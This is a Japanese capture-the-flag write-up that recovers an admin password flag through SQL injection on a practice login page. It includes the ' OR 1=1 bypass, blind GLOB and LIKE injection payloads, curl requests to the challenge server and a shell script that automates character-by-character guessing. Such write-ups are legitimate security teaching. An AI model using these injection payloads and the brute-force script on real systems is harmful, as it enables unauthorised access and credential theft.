# 自分の解答
## 1
DB問お決まりの

```
id:admin
pass:' OR 1=1
```
をするとソースが見れる。FLAGはadminのパスワードだよと言われる。つまり`FLAG_〜`という形式のパスワードであることは分かる。

## 2
```
id:admin
pass:' OR pass GLOB 'FLAG_*0*'--
```
とかしてひたすら使われてる文字探す。`*`は任意の0文字以上の文字列。【[参考](http://www.dbonline.jp/sqlite/select/index12.html)】上記はFLAGに`0`が含まれていたら認証が通る。  
`GLOB`句は大文字小文字を区別するので、まずは`LIKE`句（大文字小文字を区別しない）で見当をつけたほうが良いかもしれない。  
てかブラウザ面倒くさすぎてこの辺から

```sh
curl -d "id=admin&pass=' OR pass LIKE 'FLAG\_%0%' ESCAPE '\'--" ctfq.sweetduet.info:10080/~q6/
```
とか使い始めた。ちなみに`LIKE`句だと`*`の代わりに`%`を使う。そして`_`が任意の一文字を表すので`ESCAPE '\'`として`\`をエスケープ記号に割り当てて`_`をエスケープしてる。（実際エスケープする必要無いけど…）【[参考](http://www.dbonline.jp/sqlite/select/index6.html)】

使われてる文字が分かる。

## 3
```
id:admin
pass:' OR pass GLOB 'FLAG_??????'
```
とかして文字数を調べる。`GLOB`句において`?`は任意の一文字を表す。  
文字数が分かる。そして、重複を含むかどうかもわかる。

## 4
```
id:admin
pass:' OR pass GLOB 'FLAG_3*'
pass:' OR pass GLOB 'FLAG_???3*'
```
とかひたすらして答えを調べる。  
`N(0~15)`番目に`c(文字)`が来るかどうかを調べるシェルスクリプト。

```sh
#!/bin/sh

function check() {
pass="FLAG_"
for i in `seq 0 $1`
do
	if [ $i -ne 0 ];then
		pass+="?";
	fi
done
pass+=$2
num=`expr 15 - $1`
for i in `seq 0 $num`
do
	if [ $i -ne 0 ];then
		pass+="?";
	fi
done
curl -d "id=admin&pass=' OR pass GLOB '$pass'--" ctfq.sweetduet.info:10080/~q6/
}

RESULT=`check $@`
echo "$RESULT"
```
`check.sh`とかファイル名で保存して、例えば`./check.sh 2 A`ってやると、`pass`を`' OR pass GLOB 'FLAG_??A?????????????'--`に設定して「送信」ボタン押した時と同じようにGETリクエストを投げる。レスポンスは当然ブラウザと同じ。  
つまり`pass`が`FLAG_??A?????????????`の条件に合ってるか簡単に調べられる。  
`chmod +x check.sh`で実行権限付与するのを忘れないこと。
